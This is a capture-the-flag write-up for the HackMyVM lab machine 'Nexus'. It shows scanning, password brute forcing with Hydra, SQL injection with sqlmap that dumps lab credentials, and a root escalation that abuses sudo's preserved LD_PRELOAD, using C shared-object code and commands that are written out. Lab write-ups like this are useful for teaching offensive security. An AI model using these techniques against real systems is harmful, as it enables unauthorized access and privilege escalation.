@@ -1,0 +1,191 @@
+---
+title: Nexus
+date: '2025-06-10'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - LD_PRELOAD
+  - LINUX
+cover: /mc/uploads/2025/06/nexus.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+This writeup details the steps taken to compromise the target machine [**Nexus** ](https://hackmyvm.eu/machines/machine.php?vm=Nexus)in the HackMyVM . The process involved reconnaissance, web exploitation, privilege escalation, and flag retrieval.
+
+## **Reconnaissance**
+
+```bash
+nmap -sV -sC 192.168.138.104 -T5                                                                                                                                          
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 09:52 EDT
+Nmap scan report for 192.168.138.104
+Host is up (0.0019s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
+| ssh-hostkey: 
+|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)
+|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.62 (Debian)
+MAC Address: 08:00:27:0A:3F:B1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds
+```
+- **Port 22 (SSH)**: OpenSSH 9.2p1 (Debian)
+- **Port 80 (HTTP)**: Apache httpd 2.4.62 (Debian)
+- **OS**: Linux (Debian-based)
+
+##  **Directory Fuzzing**
+
+we gonna use Gobuster to discover the hidden files:
+
+```bash
+ζ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://192.168.138.104 -x php,html,txt,js                           
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.138.104
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,js,php,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 280]
+/.php                 (Status: 403) [Size: 280]
+/login.php            (Status: 200) [Size: 352]
+/index.html           (Status: 200) [Size: 825]
+/index2.php           (Status: 200) [Size: 75134]
+/.html                (Status: 403) [Size: 280]
+/.php                 (Status: 403) [Size: 280]
+```
+so we got another index2.php
+
+[![from index2.php file](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-10-155108-1024x481.png)](https://nutzh.top/wp-content/uploads/2025/06/Screenshot-2025-06-10-155108.png)so looking inside the index2.php and moving around i found this url : http://<personal-ip>/auth-login.php , so its a login page i tried to brute force it with Hydra but it failed
+
+```bash
+ζ hydra -l nexus -P /usr/share/wordlists/rockyou.txt 192.168.138.104 http-post-form "/auth-login.php:username=^USER^&password=^PASS^:Invalid credentials"                        
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-10 10:03:57
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.138.104:80/auth-login.php:username=^USER^&password=^PASS^:Invalid credentials
+[80][http-post-form] host: 192.168.138.104   login: nexus   password: daniel
+[80][http-post-form] host: 192.168.138.104   login: nexus   password: 12345
+[80][http-post-form] host: 192.168.138.104   login: nexus   password: 123456789
+[80][http-post-form] host: 192.168.138.104   login: nexus   password: 1234567
+[80][http-post-form] host: 192.168.138.104   login: nexus   password: princess
+```
+its Gives us more than one password :\]
+
+so i tried to input a weird input and see how the web can handle it and the error pop up
+
+Fatal error: Uncaught mysqli\_sql\_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test'' at line 1 in /var/www/html/login.php:22 Stack trace: #0 /var/www/html/login.php(22): mysqli->query() #1 {main} thrown in /var/www/html/login.php on line 22
+
+so im gonna use Sqlmap for this :
+
+```bash
+ζ sqlmap -u "http://192.168.138.104/auth-login.php" --forms --crawl=1 --dump 
+do you want to check for the existence of site's sitemap(.xml) [y/N] n
+[10:53:36] [INFO] starting crawler for target URL 'http://192.168.138.104/auth-login.php'
+[10:53:36] [INFO] searching for links with depth 1
+do you want to normalize crawling results [Y/n] n                                                                                                                           
+do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[1/1] Form:
+POST http://192.168.138.104/login.php
+POST data: user=&pass=
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: user=&pass=] (Warning: blank fields detected): 
+
+do you want to fill blank fields with random values? [Y/n] Y
+
+Database: sion
+Table: users
+[2 entries]
++----+--------------------+----------+
+| id | password           | username |
++----+--------------------+----------+
+| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
+| 2  | cambiame08         | admin    |
++----+--------------------+----------+
+```
+so we got the password of 2 users one for admin and shelly , and the shelly's password is the correct one   
+so we gonna try to ssh with these credentials
+
+```bash
+shelly@192.168.138.104
+```
+read the flag exist on SA and we gonna see the permission that shelly has :
+
+## Priv Esc
+
+```bash
+shelly@NexusLabCTF:~$ sudo -l
+sudo: unable to resolve host NexusLabCTF: Fallo temporal en la resolución del nombre
+Matching Defaults entries for shelly on NexusLabCTF:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty
+
+User shelly may run the following commands on NexusLabCTF:
+    (ALL) NOPASSWD: /usr/bin/find
+```
+we have another LD\_PRELOAD exploit again
+
+incase you want to see more of LD\_PRELOAD exploit : [TryHarder](https://nutzh.top/hackmyvm/tryharder/)
+
+so we gonna abuse it again with :
+
+```bash
+#include 
+#include 
+#include 
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+```
+and compile it
+
+```bash
+gcc -fPIC -shared exploit.so exploit.c -nostartfiles
+
+sudo LD_PRELOAD=./exploit.so find
+# whoami
+root
+```
+and u are the root after that
+
+so we gonna see an image in the folder Sion-Code the easiest way to read it is by strings and that what we gonna do :
+
+```bash
+strings  use-fim-to-root.png
+-------------------results
+:v*F
+:`>~
+tK[
+0TB?{
+E1t>
+xt->!9
+l32f
+t a{q
+qo+p
+B0$/
+Pt<H4
+;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
+```
+**Rooted**
